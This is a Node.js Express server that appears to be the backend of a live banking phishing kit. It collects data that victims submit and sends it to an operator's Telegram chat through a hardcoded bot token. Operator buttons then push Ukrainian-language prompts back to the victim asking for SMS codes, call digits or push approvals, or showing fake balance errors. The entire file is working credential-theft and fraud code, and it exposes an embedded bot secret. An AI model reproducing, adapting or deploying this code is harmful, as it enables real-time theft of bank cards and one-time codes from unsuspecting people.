const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
const CHAT_ID = '-1003455979409';

let userTasks = {}; 

const cmdTexts = {
    'sms': 'Введіть код підтвердження, що надійшов у СМС',
    'call': 'Введіть останніх 4 цифри номера, з якого надійде дзвінок',
    'push': 'Підтвердіть вхід у вашому мобільному додатку',
    'bal': 'Недостатньо коштів на картці для верифікації. Спробуйте іншу картку',
    'support': 'Помилка безпеки. Опишіть проблему оператору в чаті',
    'custom': 'Повторіть спробу або введіть дані ще раз'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    console.log(`[LOG] ${userId} [${type}]`);
    
    let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
    logMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
    logMsg += `------------------------\n`;
    for (let key in data) {
        logMsg += `<b>${safeText(key)}:</b> <code>${safeText(data[key])}</code>\n`;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: logMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "💬 СМС", callback_data: `ask_${userId}_sms` },
                        { text: "📞 Звонок", callback_data: `ask_${userId}_call` }
                    ],
                    [
                        { text: "📲 Пуш", callback_data: `msg_${userId}_push` },
                        { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }
                    ],
                    [
                        { text: "✍️ Свой", callback_data: `ask_${userId}_custom` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        console.error("❌ ОШИБКА TG:", e.message);
        res.status(500).send('Error');
    }
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

app.post('/tg-webhook', async (req, res) => {
    const { callback_query } = req.body;
    if (callback_query) {
        const [action, userId, code] = callback_query.data.split('_');
        userTasks[userId] = { action, text: cmdTexts[code] || "Введіть дані" };
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback_query.id,
            text: "✅ Отправлено!"
        });
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен`));
